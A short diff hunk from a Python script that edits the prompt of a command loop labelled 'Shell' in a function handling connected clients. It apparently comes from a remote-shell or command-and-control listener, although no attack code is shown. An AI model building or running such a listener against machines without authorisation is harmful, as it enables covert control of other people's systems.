@@ -103,7 +103,7 @@ def handleClient():
     currentClient = 0
     while True:
         try:
-            cmd = input(f'{red}Shell{blue}{clientAdList[currentClient]}{red}>{blue} ')
+            cmd = input(f'{red}Shell{blue}{clientAdList[currentClient]}[{currentClient}]){red}>{blue} ')
             try:
                 t2.join(0.01)
             except :
